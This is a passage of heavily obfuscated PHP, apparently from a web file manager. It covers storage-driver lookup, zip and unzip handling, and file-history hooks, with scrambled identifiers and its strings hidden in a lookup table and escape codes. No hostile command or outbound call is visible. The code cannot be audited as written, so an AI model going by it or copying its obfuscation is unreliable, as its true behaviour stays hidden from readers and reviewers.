Exception("\146\151\x6c\x65\122\145\141\x64\40\145\x72\162\157\x72\x21\x20\x73\x74\141\162\x74\x3d{$§ƒŒš©}\x3b\154\145\156\x67\x74\150\x3d{$ÁóòÂçÒ}\73\40\163\151\x7a\x65\x3d{$á©°ÎŞ}\x3b"); } $çĞ×¯ù’ = $¬³èî«->fileSubstr($Â±¤‡‚, $§ƒŒš©, $ÁóòÂçÒ); if (!$çĞ×¯ù’ && $ÁóòÂçÒ && isset($GLOBALS[$¬û‡Õ”Ñ[1164]])) { throw new Exception($GLOBALS[$¬û‡Õ”Ñ[1164]][$¬û‡Õ”Ñ[1165]]); } return $çĞ×¯ù’; } private static function driverMake(&$ò‘øºÆ) { $ÑË¤š‡ =& $_SERVER[¹Û¹Æ€]; $ä¤¾È¨§ = KodIO::parse($ò‘øºÆ); if (!self::$driverListSystem) { $ƒ²¶°©® = Model($ÑË¤š‡[765])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ƒ²¶°©®, $ÑË¤š‡[408]); } if ($ä¤¾È¨§[$ÑË¤š‡[43]] == KodIO::KOD_IO && !self::$driverListSystem[$ä¤¾È¨§[$ÑË¤š‡[408]]]) { return !1; } $ò‘øºÆ = $ä¤¾È¨§[$ÑË¤š‡[1166]]; $ğ Ä–¨Ó = self::driverGet($ä¤¾È¨§, $ò‘øºÆ); return $ğ Ä–¨Ó; } private static function driverGet($‰ÎÎ’¼€, &$·ûë¬ï) { $¹‹¨ÁÙø =& $_SERVER[¹Û¹Æ€]; $û ïëå = $‰ÎÎ’¼€[$¹‹¨ÁÙø[1167]]; $Ñ‘”Œ” = $‰ÎÎ’¼€[$¹‹¨ÁÙø[408]]; switch ($‰ÎÎ’¼€[$¹‹¨ÁÙø[43]]) { case KodIO::KOD_IO: $øÓ¼ŞµÜ = self::$driverListSystem[$Ñ‘”Œ”]; break; case KodIO::KOD_SOURCE: $·ûë¬ï = $Ñ‘”Œ” . $·ûë¬ï; $øÓ¼ŞµÜ = array($¹‹¨ÁÙø[1168] => $¹‹¨ÁÙø[1169], $¹‹¨ÁÙø[16] => $‰ÎÎ’¼€); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ùÁ€È¤‹ = $GLOBALS[$¹‹¨ÁÙø[1170]]; self::$driverListUser = array_to_keyvalue($ùÁ€È¤‹, $¹‹¨ÁÙø[408]); } $øÓ¼ŞµÜ = self::$driverListUser[$Ñ‘”Œ”]; break; case KodIO::KOD_SHARE_LINK: $øÓ¼ŞµÜ = array($¹‹¨ÁÙø[1168] => $¹‹¨ÁÙø[1171], $¹‹¨ÁÙø[16] => $‰ÎÎ’¼€); $¨©¡Ó¬ä = Action($¹‹¨ÁÙø[1172])->sharePathInfo($‰ÎÎ’¼€[$¹‹¨ÁÙø[94]]); $·ûë¬ï = $¨©¡Ó¬ä[$¹‹¨ÁÙø[411]]; if (!$¨©¡Ó¬ä[$¹‹¨ÁÙø[411]]) { $Ö †µ = Model($¹‹¨ÁÙø[610])->getInfo($¨©¡Ó¬ä[$¹‹¨ÁÙø[498]]); $·ûë¬ï = KodIO::clear($Ö †µ[$¹‹¨ÁÙø[1173]] . $‰ÎÎ’¼€[$¹‹¨ÁÙø[1166]]); $‰ÎÎ’¼€[$¹‹¨ÁÙø[496]] = $Ö †µ; $‰ÎÎ’¼€[$¹‹¨ÁÙø[1148]] = $·ûë¬ï; $øÓ¼ŞµÜ = array($¹‹¨ÁÙø[1168] => $¹‹¨ÁÙø[1174], $¹‹¨ÁÙø[16] => $‰ÎÎ’¼€); } break; case KodIO::KOD_SHARE_ITEM: $øÓ¼ŞµÜ = array($¹‹¨ÁÙø[1168] => $¹‹¨ÁÙø[1175], $¹‹¨ÁÙø[16] => $‰ÎÎ’¼€); $Ö †µ = Model($¹‹¨ÁÙø[610])->getInfo($‰ÎÎ’¼€[$¹‹¨ÁÙø[408]]); if ($Ö †µ[$¹‹¨ÁÙø[411]] == $¹‹¨ÁÙø[207]) { $·ûë¬ï = KodIO::clear($Ö †µ[$¹‹¨ÁÙø[1173]] . $‰ÎÎ’¼€[$¹‹¨ÁÙø[1166]]); $‰ÎÎ’¼€[$¹‹¨ÁÙø[496]] = $Ö †µ; $‰ÎÎ’¼€[$¹‹¨ÁÙø[1148]] = $·ûë¬ï; $øÓ¼ŞµÜ = array($¹‹¨ÁÙø[1168] => $¹‹¨ÁÙø[1176], $¹‹¨ÁÙø[16] => $‰ÎÎ’¼€); } else { if (!$·ûë¬ï) { $·ûë¬ï = $Ö †µ[$¹‹¨ÁÙø[411]]; } } break; default: $·ûë¬ï = $‰ÎÎ’¼€[$¹‹¨ÁÙø[94]]; $øÓ¼ŞµÜ = array($¹‹¨ÁÙø[1168] => $¹‹¨ÁÙø[1177]); break; } $ıÄÃèÙ = $‰ÎÎ’¼€[$¹‹¨ÁÙø[94]]; if (!isset(self::$driverCache[$ıÄÃèÙ])) { $ØÉÓôù = strtolower($øÓ¼ŞµÜ[$¹‹¨ÁÙø[105]]); $ù×ü•÷ = $GLOBALS[$¹‹¨ÁÙø[16]][$¹‹¨ÁÙø[99]][$¹‹¨ÁÙø[824]]; $–®šùç· = $¹‹¨ÁÙø[84] . (isset($ù×ü•÷[$ØÉÓôù]) ? $ù×ü•÷[$ØÉÓôù] : ucfirst($ØÉÓôù)); if (!class_exists($–®šùç·)) { show_json("{$–®šùç·}\40\x6e\157\164\40\145\170\x69\x73\164\x73\41", !1); } $¯ÖÑèÇ = isset($øÓ¼ŞµÜ[$¹‹¨ÁÙø[16]]) ? $øÓ¼ŞµÜ[$¹‹¨ÁÙø[16]] : !1; self::$driverCache[$ıÄÃèÙ] = new $–®šùç·($¯ÖÑèÇ); } $á€ë¢É½ = self::$driverCache[$ıÄÃèÙ]; $á€ë¢É½->pathDriver = $û ïëå; $á€ë¢É½->pathBase = $¹‹¨ÁÙø[22]; if (isset($øÓ¼ŞµÜ[$¹‹¨ÁÙø[16]][$¹‹¨ÁÙø[1178]])) { $á€ë¢É½->pathBase = rtrim($øÓ¼ŞµÜ[$¹‹¨ÁÙø[16]][$¹‹¨ÁÙø[1178]], $¹‹¨ÁÙø[18]) . $¹‹¨ÁÙø[18]; $·ûë¬ï = $á€ë¢É½->pathBase . ltrim($·ûë¬ï, $¹‹¨ÁÙø[18]); } $·ûë¬ï = $á€ë¢É½->getPath($·ûë¬ï); if (isset($‰ÎÎ’¼€[$¹‹¨ÁÙø[1148]])) { $·ûë¬ï = $‰ÎÎ’¼€[$¹‹¨ÁÙø[1148]]; } $á€ë¢É½->path = $·ûë¬ï; return $á€ë¢É½; } public static function errorTips($±§“òªö = false) { $à¯ÅÜÔî =& $_SERVER[¹Û¹Æ€]; static $³ı¤××‚ = array(); $ ÄÎÙº‹ = 1000; if ($±§“òªö === -1) { return $³ı¤××‚ ? $³ı¤××‚[count($³ı¤××‚) - 1] : $à¯ÅÜÔî[22]; } if ($±§“òªö === !1) { return implode($à¯ÅÜÔî[12], $³ı¤××‚); } if (count($³ı¤××‚) >= $ ÄÎÙº‹) { $³ı¤××‚ = array_slice($³ı¤××‚, $ ÄÎÙº‹ * 0.5, $ ÄÎÙº‹); } $³ı¤××‚[] = $±§“òªö; write_log($à¯ÅÜÔî[172] . ACTION . $à¯ÅÜÔî[1179] . $±§“òªö, $à¯ÅÜÔî[1180]); } public static function getLastError($¢ÓÏÉÅå = '') { $Ó¤£•Â = self::errorTips(-1); return $Ó¤£•Â ? $Ó¤£•Â : $¢ÓÏÉÅå; } } goto C²‘Æµ¿‹”; C²‘Æµ¿‹”: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $õê˜àé¼; if ($õê˜àé¼) { return $õê˜àé¼; } $Œ§õß’ = IO::init($_SERVER[¹Û¹Æ€][18]); return $Œ§õß’; } private static function iconvSystem($„ğï²Üˆ) { return self::local()->iconvSystem($„ğï²Üˆ); } private static function iconvApp($ø¥¢½âß) { return self::local()->iconvApp($ø¥¢½âß); } public static function zipFolder($ÊÀ²çğñ, $¾©ø‚ÄÊ = "\x7a\x69\160", $Üßì–ËÂ = '', $ö€©§Ûä = REPEAT_RENAME) { $é«»ˆÄô =& $_SERVER[¹Û¹Æ€]; $ÁûƒÒÇĞ = IO::listPath($ÊÀ²çğñ); if (!$ÁûƒÒÇĞ) { return !1; } $ÁûƒÒÇĞ = array_merge($ÁûƒÒÇĞ[$é«»ˆÄô[92]], $ÁûƒÒÇĞ[$é«»ˆÄô[93]]); return self::zip($ÁûƒÒÇĞ, $¾©ø‚ÄÊ, $Üßì–ËÂ, $ö€©§Ûä); } public static function zip($áœİãûË, $¦°ûëš« = "\172\x69\x70", $Ëæ¡¿æŠ = '', $²ÍáÎÚÁ = REPEAT_RENAME) { $úÕ­×ß… =& $_SERVER[¹Û¹Æ€]; if (is_string($áœİãûË) && $áœİãûË) { $áœİãûË = array(array($úÕ­×ß…[94] => $áœİãûË)); } $«©¿Çõ = self::init($áœİãûË[0][$úÕ­×ß…[94]]); $ÛÕ±ıÊ” = self::info($áœİãûË[0][$úÕ­×ß…[94]]); $æâ¢Ôùö = $úÕ­×ß…[22]; $½Úó…ëñ = $úÕ­×ß…[22]; $ÔâšÜª¸ = $úÕ­×ß…[22]; if ($Ëæ¡¿æŠ) { $½Úó…ëñ = get_path_father($Ëæ¡¿æŠ); $ÔâšÜª¸ = get_path_this($Ëæ¡¿æŠ); } else { $½Úó…ëñ = self::pathFather($ÛÕ±ıÊ”[$úÕ­×ß…[94]]); $ÔâšÜª¸ = $ÛÕ±ıÊ”[$úÕ­×ß…[42]] . $úÕ­×ß…[20] . $¦°ûëš«; if (count($áœİãûË) > 1) { $˜Â«²”« = IO::info($½Úó…ëñ); $ÔâšÜª¸ = $˜Â«²”«[$úÕ­×ß…[42]] . $úÕ­×ß…[20] . $¦°ûëš«; } } if ($«©¿Çõ->getType() == $úÕ­×ß…[116]) { $ØŒ¯·’ = self::init($½Úó…ëñ); $äîğû‰Ò = $ØŒ¯·’->getType() == $úÕ­×ß…[116] ? $½Úó…ëñ : get_path_father($«©¿Çõ->path); $äîğû‰Ò = rtrim($äîğû‰Ò, $úÕ­×ß…[18]) . $úÕ­×ß…[18]; mk_dir($äîğû‰Ò); } else { $æâ¢Ôùö = TEMP_FILES . $úÕ­×ß…[1181] . time() . rand_string(8) . $úÕ­×ß…[18]; mk_dir($æâ¢Ôùö); file_put_contents($æâ¢Ôùö . $úÕ­×ß…[1182], $úÕ­×ß…[22]); $äîğû‰Ò = $æâ¢Ôùö; } $¿Ùâë¿ = IO::info($äîğû‰Ò); if (!$¿Ùâë¿ || !$¿Ùâë¿[$úÕ­×ß…[212]]) { show_json(LNG($úÕ­×ß…[1183]), !1); } $Ôø€¨’Ê = self::zipFileList($áœİãûË, $æâ¢Ôùö); foreach ($Ôø€¨’Ê as $ƒÇÌ³³ => $Ï²úÌ) { $Ôø€¨’Ê[$ƒÇÌ³³] = self::iconvSystem($Ï²úÌ); } $¡äÌ÷Ü = get_filename_auto($äîğû‰Ò . $ÔâšÜª¸, $úÕ­×ß…[22], $²ÍáÎÚÁ); KodArchive::create(self::iconvSystem($¡äÌ÷Ü), $Ôø€¨’Ê); if (!IO::exist($¡äÌ÷Ü)) { if ($æâ¢Ôùö) { del_dir($æâ¢Ôùö); } show_json(LNG($úÕ­×ß…[1184]), !1); } if (!$æâ¢Ôùö) { return $¡äÌ÷Ü; } $ğ™øüøç = self::move($¡äÌ÷Ü, $½Úó…ëñ, $²ÍáÎÚÁ); if ($æâ¢Ôùö) { del_dir($æâ¢Ôùö); } if (!$¡äÌ÷Ü) { show_json(LNG($úÕ­×ß…[1184]), !1); } return $ğ™øüøç; } public static function unzip($¤ ‚şû³, $’³ªÍŒ„, $ùâß…Û™ = "\x2d\61", $Èç¦»ÁÒ = "\x72\x65\x70\x6c\x61\x63\x65") { $©ÛÊ²¥ =& $_SERVER[¹Û¹Æ€]; $çÂŒŸ‘ß = parent::info($¤ ‚şû³); if (!$çÂŒŸ‘ß) { show_json(LNG($©ÛÊ²¥[1185]), !1); } $ßéÀêßë = IO::infoFull($’³ªÍŒ„); if (!$ßéÀêßë) { $’³ªÍŒ„ = IO::mkdir($’³ªÍŒ„); } if (isset($ßéÀêßë[$©ÛÊ²¥[411]]) && trim($ßéÀêßë[$©ÛÊ²¥[94]], $©ÛÊ²¥[18]) != trim($’³ªÍŒ„, $©ÛÊ²¥[18])) { $şÜöšíÄ = KodIO::make($ßéÀêßë[$©ÛÊ²¥[441]]); $ï–Åûõø = IO::fileNameAuto($şÜöšíÄ, $ßéÀêßë[$©ÛÊ²¥[42]], REPEAT_RENAME_FOLDER, !0); $’³ªÍŒ„ = IO::mkdir($şÜöšíÄ . $ï–Åûõø); } $ùâß…Û™ = $ùâß…Û™ && $ùâß…Û™ != $©ÛÊ²¥[1186] ? @json_decode($ùâß…Û™, !0) : -1; $—ıä²ï = self::unzipPart($¤ ‚şû³, $ùâß…Û™); if (!$—ıä²ï || !IO::exist($—ıä²ï[$©ÛÊ²¥[209]])) { show_json(LNG($©ÛÊ²¥[115]), !1); } $¨…çëë = $—ıä²ï[$©ÛÊ²¥[1187]][count($—ıä²ï[$©ÛÊ²¥[1187]]) - 1]; if ($¨…çëë[$©ÛÊ²¥[1188]] == -1 || substr($¨…çëë[$©ÛÊ²¥[42]], -1, 1) == $©ÛÊ²¥[18]) { $ó»¿ñÅ‡ = $—ıä²ï[$©ÛÊ²¥[1189]] . rand_string(10) . $©ÛÊ²¥[18]; mk_dir($ó»¿ñÅ‡); $Ö‚Ôï‚ = count($—ıä²ï[$©ÛÊ²¥[1187]]) == 1 ? IO::ext($¤ ‚şû³) : get_path_ext($—ıä²ï[$©ÛÊ²¥[209]]); $Şï¡¸Ê = KodArchive::extract(self::iconvSystem($—ıä²ï[$©ÛÊ²¥[209]]), $ó»¿ñÅ‡, $¨…çëë[$©ÛÊ²¥[1188]], $ï–Åûõø, $Ö‚Ôï‚); self::unzipErrorCheck($Şï¡¸Ê, array($©ÛÊ²¥[1190], $¤ ‚şû³, $Ö‚Ôï‚, $’³ªÍŒ„, $—ıä²ï)); Hook::trigger($©ÛÊ²¥[1191], $ó»¿ñÅ‡); recursion_dir($ó»¿ñÅ‡, $¸çß®, $ü·—è¢Ù, 0); $Ì¯ĞÎÖ = array_merge($¸çß®, $ü·—è¢Ù); $¸®™û¥‘ = array(); foreach ($Ì¯ĞÎÖ as $ÕŠ²ÁÅ†) { $ÅºìÒµ = IO::move(self::iconvApp($ÕŠ²ÁÅ†), $’³ªÍŒ„, $Èç¦»ÁÒ); if ($ÅºìÒµ) { $¸®™û¥‘[] = $ÅºìÒµ; } } del_dir($ó»¿ñÅ‡); } else { $ÅºìÒµ = IO::move($—ıä²ï[$©ÛÊ²¥[209]], $’³ªÍŒ„, $Èç¦»ÁÒ, get_path_this($¨…çëë[$©ÛÊ²¥[42]])); if ($ÅºìÒµ) { $¸®™û¥‘[] = $ÅºìÒµ; } } return $¸®™û¥‘ ? $¸®™û¥‘ : !1; } public static function unzipList($€‹’â¥š) { $óšÄÇ¾± =& $_SERVER[¹Û¹Æ€]; $Œ¾ÓƒŸ‡ = isset($€‹’â¥š[$óšÄÇ¾±[1192]]) ? $€‹’â¥š[$óšÄÇ¾±[1192]] : !1; $Ëèˆø = isset($€‹’â¥š[$óšÄÇ¾±[1188]]) ? @json_decode($€‹’â¥š[$óšÄÇ¾±[1188]], !0) : -1; $‰®±ÇÜô = self::unzipPart($€‹’â¥š[$óšÄÇ¾±[94]], $Ëèˆø); if (!$‰®±ÇÜô || !IO::exist($‰®±ÇÜô[$óšÄÇ¾±[209]])) { show_json(LNG($óšÄÇ¾±[115]), !1); } $¢÷Û•ê = $‰®±ÇÜô[$óšÄÇ¾±[1187]][count($‰®±ÇÜô[$óšÄÇ¾±[1187]]) - 1]; $¾ÏåÊòÛ = in_array(IO::ext($‰®±ÇÜô[$óšÄÇ¾±[209]]), array($óšÄÇ¾±[322], $óšÄÇ¾±[1193], $óšÄÇ¾±[1194], $óšÄÇ¾±[1195], $óšÄÇ¾±[1196], $óšÄÇ¾±[1197])); if (!$Œ¾ÓƒŸ‡ && ($¢÷Û•ê[$óšÄÇ¾±[1188]] == -1 || $¾ÏåÊòÛ)) { $¾”ôÖÁ¦ = $‰®±ÇÜô[$óšÄÇ¾±[1189]] . get_path_this($‰®±ÇÜô[$óšÄÇ¾±[209]]) . $óšÄÇ¾±[1198]; if (!IO::exist($¾”ôÖÁ¦)) { $™Ü©´à“ = $¢÷Û•ê[$óšÄÇ¾±[1188]] == -1 ? get_path_ext(IO::pathThis($€‹’â¥š[$óšÄÇ¾±[94]])) : get_path_ext($‰®±ÇÜô[$óšÄÇ¾±[209]]); $ƒĞ¡¢â£ = KodArchive::listContent(self::iconvSystem($‰®±ÇÜô[$óšÄÇ¾±[209]]), !0, $™Ü©´à“); self::unzipErrorCheck($ƒĞ¡¢â£, array($óšÄÇ¾±[1199], $€‹’â¥š, $‰®±ÇÜô)); @file_put_contents($¾”ôÖÁ¦, json_encode($ƒĞ¡¢â£[$óšÄÇ¾±[1200]])); } return @json_decode(IO::getContent($¾”ôÖÁ¦), !0); } IO::fileOut($‰®±ÇÜô[$óšÄÇ¾±[209]], $Œ¾ÓƒŸ‡, get_path_this($¢÷Û•ê[$óšÄÇ¾±[42]])); die; } private static function zipFileList($ó‡ºô¼, $¢±Ø’ù = false) { $¤şø¯¹ï =& $_SERVER[¹Û¹Æ€]; $¢Ó‘úÆ« = array(); foreach ($ó‡ºô¼ as $ÕÕõ–¯) { $Ã‰ş•¿ = $ÕÕõ–¯[$¤şø¯¹ï[94]]; if ($¢±Ø’ù) { $Ã‰ş•¿ = self::copy($ÕÕõ–¯[$¤şø¯¹ï[94]], $¢±Ø’ù, $¤şø¯¹ï[816]); } else { $ÊÕĞ”ü¦ = self::init($ÕÕõ–¯[$¤şø¯¹ï[94]]); if ($ÊÕĞ”ü¦->getType() == $¤şø¯¹ï[116]) { $Ã‰ş•¿ = $ÊÕĞ”ü¦->path; } } if ($Ã‰ş•¿ && self::local()->exist($Ã‰ş•¿)) { $¢Ó‘úÆ«[$ÕÕõ–¯[$¤şø¯¹ï[94]]] = $Ã‰ş•¿; } } if (!empty($¢Ó‘úÆ«)) { return array_values($¢Ó‘úÆ«); } show_json(LNG($¤şø¯¹ï[1163]), !1); } private static function localFilePath($ÛÀìˆü) { $¤‡šºÆß =& $_SERVER[¹Û¹Æ€]; $»Ø£¿¢ = KodIO::parse($ÛÀìˆü); if ($»Ø£¿¢[$¤‡šºÆß[43]] == KodIO::KOD_SOURCE) { $™“¥ğ ® = Model($¤‡šºÆß[823])->fileInfoGet(KodIO::sourceID($ÛÀìˆü)); if (!$™“¥ğ ®[$¤‡šºÆß[94]]) { show_json($¤‡šºÆß[1201], !1); } $ÛÀìˆü = $™“¥ğ ®[$¤‡šºÆß[94]]; } $ ±ÖÜëø = self::init($ÛÀìˆü); if ($ ±ÖÜëø->pathParse[$¤‡šºÆß[1148]]) { $ÛÀìˆü = $ ±ÖÜëø->pathParse[$¤‡šºÆß[1148]]; $ ±ÖÜëø = self::init($ÛÀìˆü); } $¶¾¯šùù = $ ±ÖÜëø->getType(); if ($¶¾¯šùù == $¤‡šºÆß[116] || $¶¾¯šùù == $¤‡šºÆß[1202]) { if (!$ ±ÖÜëø->exist($ ±ÖÜëø->path)) { show_json(LNG($¤‡šºÆß[115]), !1); } return $ ±ÖÜëø->path; } return !1; } public static function unzipPart($ÏãÈÌä, $×Å±¶Ú = -1) { $Î¶½µèÊ =& $_SERVER[¹Û¹Æ€]; $²÷ıÂúĞ = IO::pathThis($ÏãÈÌä); if (!$×Å±¶Ú || $×Å±¶Ú == -1) { $Ùì¡áœ = array(array($Î¶½µèÊ[42] => $²÷ıÂúĞ, $Î¶½µèÊ[1188] => -1)); $Ùì¡áœ[0][$Î¶½µèÊ[1203]] = $Ùì¡áœ[0][$Î¶½µèÊ[42]]; } else { if (is_array($×Å±¶Ú)) { $Ùì¡áœ = $×Å±¶Ú; $ß×í»´Š = count($Ùì¡áœ) - 1; for ($ªóæ½÷Á = 0; $ªóæ½÷Á <= $ß×í»´Š; $ªóæ½÷Á++) { $ÍˆÃœ’Ö = $Ùì¡áœ[$ªóæ½÷Á]; $â¡‡ƒÅ— = get_path_this($ÍˆÃœ’Ö[$Î¶½µèÊ[42]]) . (checkExtSafe($ÍˆÃœ’Ö[$Î¶½µèÊ[42]]) ? $Î¶½µèÊ[22] : $Î¶½µèÊ[1204]); $Ùì¡áœ[$ªóæ½÷Á][$Î¶½µèÊ[1203]] = $Î¶½µèÊ[1205] . intval($ÍˆÃœ’Ö[$Î¶½µèÊ[1188]]) . $Î¶½µèÊ[395] . $â¡‡ƒÅ—; if ($ªóæ½÷Á == 0) { continue; } $Ùì¡áœ[$ªóæ½÷Á][$Î¶½µèÊ[1203]] = $Ùì¡áœ[$ªóæ½÷Á - 1][$Î¶½µèÊ[1203]] . $Î¶½µèÊ[1206] . $Ùì¡áœ[$ªóæ½÷Á][$Î¶½µèÊ[1203]]; } } } if (!is_array($Ùì¡áœ) || count($Ùì¡áœ) == 0) { return !1; } $‘ßùãıÀ = $Ùì¡áœ[count($Ùì¡áœ) - 1]; if (!IO::exist($ÏãÈÌä)) { return !1; } $¦”íü£§ = TEMP_FILES . $Î¶½µèÊ[1207] . kodIO::hashPathSafe($ÏãÈÌä) . $Î¶½µèÊ[18]; $äâª¶»› = $¦”íü£§ . $‘ßùãıÀ[$Î¶½µèÊ[1203]]; mk_dir($¦”íü£§); file_put_contents(TEMP_FILES . $Î¶½µèÊ[1182], $Î¶½µèÊ[22]); if (IO::exist($äâª¶»›)) { return array($Î¶½µèÊ[209] => $äâª¶»›, $Î¶½µèÊ[1187] => $Ùì¡áœ, $Î¶½µèÊ[1189] => $¦”íü£§); } $ÑÌ±ü« = self::localFilePath($ÏãÈÌä); if (!$ÑÌ±ü«) { $ÑÌ±ü« = $¦”íü£§ . $Î¶½µèÊ[1208]; if (!IO::exist($ÑÌ±ü«)) { self::copy($ÏãÈÌä, $¦”íü£§, !1, get_path_this($ÑÌ±ü«)); } } if (!$ÑÌ±ü« || !IO::exist($ÑÌ±ü«)) { return !1; } if ($‘ßùãıÀ[$Î¶½µèÊ[1188]] == -1) { return array($Î¶½µèÊ[209] => $ÑÌ±ü«, $Î¶½µèÊ[1187] => $Ùì¡áœ, $Î¶½µèÊ[1189] => $¦”íü£§); } $±à«¯± = $ÑÌ±ü«; foreach ($Ùì¡áœ as $ªóæ½÷Á => $ÍˆÃœ’Ö) { if (!$ÍˆÃœ’Ö || $ÍˆÃœ’Ö[$Î¶½µèÊ[1188]] == $Î¶½µèÊ[1186]) { break; } if (substr($ÍˆÃœ’Ö[$Î¶½µèÊ[42]], -1, 1) == $Î¶½µèÊ[18]) { break; } $¢ÀÉÊ­ê = in_array(get_path_ext($ÍˆÃœ’Ö[$Î¶½µèÊ[1203]]), array($Î¶½µèÊ[322], $Î¶½µèÊ[1193], $Î¶½µèÊ[1194], $Î¶½µèÊ[1195], $Î¶½µèÊ[1196], $Î¶½µèÊ[1197])); $ìšİä’ö = $ªóæ½÷Á == count($Ùì¡áœ) - 1 && $¢ÀÉÊ­ê; $Üõ§³…Ÿ = $¦”íü£§ . $ÍˆÃœ’Ö[$Î¶½µèÊ[1203]]; $×’Ñï = $¦”íü£§ . get_path_this($ÍˆÃœ’Ö[$Î¶½µèÊ[42]]); if (IO::exist($Üõ§³…Ÿ)) { $±à«¯± = $Üõ§³…Ÿ; continue; } $•ç›ë°› = $ªóæ½÷Á == 0 ? get_path_ext($²÷ıÂúĞ) : get_path_ext($±à«¯±); $Ğ¹ÅÄ¬ = KodArchive::extract(self::iconvSystem($±à«¯±), $¦”íü£§, $ÍˆÃœ’Ö[$Î¶½µèÊ[1188]], $’÷¸íÀ, $•ç›ë°›); self::unzipErrorCheck($Ğ¹ÅÄ¬, array($Î¶½µèÊ[1209], $ÏãÈÌä, $Ùì¡áœ, $ÍˆÃœ’Ö, $Üõ§³…Ÿ)); if (IO::exist($×’Ñï)) { IO::rename($×’Ñï, get_path_this($Üõ§³…Ÿ)); } $±à«¯± = $Üõ§³…Ÿ; } $äâª¶»› = $±à«¯±; return array($Î¶½µèÊ[209] => $±à«¯±, $Î¶½µèÊ[1187] => $Ùì¡áœ, $Î¶½µèÊ[1189] => $¦”íü£§); } private static function unzipErrorCheck($“ò¼ã¤½, $¯ €”º¬ = false) { $îĞÊ‚ =& $_SERVER[¹Û¹Æ€]; if ($“ò¼ã¤½[$îĞÊ‚[1210]]) { return !0; } write_log(array($îĞÊ‚[1211], $“ò¼ã¤½, $¯ €”º¬), $îĞÊ‚[1212]); show_json($îĞÊ‚[1213] . json_encode($“ò¼ã¤½[$îĞÊ‚[1200]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Öã¤ñãü =& $_SERVER[¹Û¹Æ€]; $°ÑÄÅÎÖ = $GLOBALS[$Öã¤ñãü[16]][$Öã¤ñãü[99]]; if ($°ÑÄÅÎÖ[$Öã¤ñãü[1214]] != 1) { return; } if ($°ÑÄÅÎÖ[$Öã¤ñãü[1215]] <= 0) { return; } if (isset($_REQUEST[$Öã¤ñãü[1216]]) && $_REQUEST[$Öã¤ñãü[1216]] == $Öã¤ñãü[98]) { return; } Hook::bind($Öã¤ñãü[1217], $Öã¤ñãü[1218]); Hook::bind($Öã¤ñãü[1219], $Öã¤ñãü[1220]); Hook::bind($Öã¤ñãü[1221], $Öã¤ñãü[1222]); Hook::bind($Öã¤ñãü[1223], $Öã¤ñãü[1224]); Hook::bind($Öã¤ñãü[1225], $Öã¤ñãü[1226]); Hook::bind($Öã¤ñãü[1227], $Öã¤ñãü[1228]); } public static function eventBeforeUpload($öåîá„) { if ($öåîá„[3] && $öåîá„[3] != REPEAT_REPLACE) { return; } $­¥û¡×— = self::parsePath($öåîá„[0]); if (!$­¥û¡×—) { return; } self::add($­¥û¡×—); } public static function eventBeforeEdit($°’Åøãæ) { $öëÈ…Í = self::parsePath($°’Åøãæ[0]); if (!$öëÈ…Í) { return; } self::add($öëÈ…Í); } public static function eventBeforeCopyFile($œ¨å¸éÑ, $÷âÍà, $È•æ¼¹, $ÓèÉ§ÌÙ, $ÙÃÀÅĞ, $ãè“ßÒ«) { $Ö•»†¸ =& $_SERVER[¹Û¹Æ€]; if (isset($È•æ¼¹->_data[$Ö•»†¸[1152]]) && $È•æ¼¹->_data[$Ö•»†¸[1152]]) { return; } $ºÎÈ‚Şš = $È•æ¼¹->getPathOuter($ÓèÉ§ÌÙ); $µı¾Ş = self::parsePath($ºÎÈ‚Şš); if (!$µı¾Ş) { return; } self::add($µı¾Ş); } public static function eventBeforeRename($í€şÏïè) { $““ûˆÒ˜ =& $_SERVER[¹Û¹Æ€]; $÷±Î©¬ = self::parsePath($í€şÏïè[0]); if (!$÷±Î©¬) { return; } $¿áÊµÒµ = self::checkInHistory($÷±Î©¬); if (!$¿áÊµÒµ) { return; } if ($¿áÊµÒµ[$““ûˆÒ˜[43]] == $““ûˆÒ˜[209]) { $Å¦ñ±° = self::listData($÷±Î©¬); if ($Å¦ñ±° && $Å¦ñ±°[$““ûˆÒ˜[378]]) { self::moveHistory($÷±Î©¬, $í€şÏïè[1]); } } else { IO::rename($¿áÊµÒµ[$““ûˆÒ˜[94]], $í€şÏïè[1]); } } public static function eventBeforeMove($É…¢½Ÿó) { $¶¼µê·ø =& $_SERVER[¹Û¹Æ€]; $ğÌ†ª†Û = self::parsePath($É…¢½Ÿó[0]); if (!$ğÌ†ª†Û) { return; } $ÎÒâ¢Õ = self::parsePath($É…¢½Ÿó[1]); if (!$ÎÒâ¢Õ) { return; } $Í¥ğìş§ = $É…¢½Ÿó[3]; $ßùŠ ª¸ = self::checkInHistory($ğÌ†ª†Û); if (!$ßùŠ ª¸) { return; } $§•½ƒ³Ê = self::pathHistory($ÎÒâ¢Õ); if ($ßùŠ ª¸[$¶¼µê·ø[43]] == $¶¼µê·ø[209]) { $ùÙ¡Á˜ı = self::listData($ğÌ†ª†Û); $æ©ç¡¡© = rtrim($ÎÒâ¢Õ, $¶¼µê·ø[18]) . $¶¼µê·ø[18] . ($Í¥ğìş§ ? $Í¥ğìş§ : get_path_this($ğÌ†ª†Û)); $ù¶ñÏ¥ê = self::listData($æ©ç¡¡©); if ($ùÙ¡Á˜ı && $ùÙ¡Á˜ı[$¶¼µê·ø[378]] && $ù¶ñÏ¥ê && $ù¶ñÏ¥ê[$¶¼µê·ø[378]]) { return self::clear($ğÌ†ª†Û); } if ($ùÙ¡Á˜ı && $ùÙ¡Á˜ı[$¶¼µê·ø[378]]) { self::moveHistory($ğÌ†ª†Û, $Í¥ğìş§, $§•½ƒ³Ê); } } else { IO::move($ßùŠ ª¸[$¶¼µê·ø[94]], $§•½ƒ³Ê, !1, $Í¥ğìş§); self::clearEmptyFolder(IO::pathFather($ßùŠ ª¸[$¶¼µê·ø[94]])); } } public static function eventAfterRemove($å¢µ®¾£, $½¥Å›¤ƒ) { $ğÃãÂ•ä =& $_SERVER[¹Û¹Æ€]; if (!$½¥Å›¤ƒ) { return; } $›·¶ğÎ¢ = self::parsePath($å¢µ®¾£[0]); if (!$›·¶ğÎ¢) { return; } $ø¿€¨ÍÙ = self::checkInHistory($›·¶ğÎ¢); if (!$ø¿€¨ÍÙ) { return; } if ($ø¿€¨ÍÙ[$ğÃãÂ•ä[43]] == $ğÃãÂ•ä[209]) { $Å¶ÖÍ¿Ÿ = self::listData($›·¶ğÎ¢, !1); if ($Å¶ÖÍ¿Ÿ && $Å¶ÖÍ¿Ÿ[$ğÃãÂ•ä[378]]) { 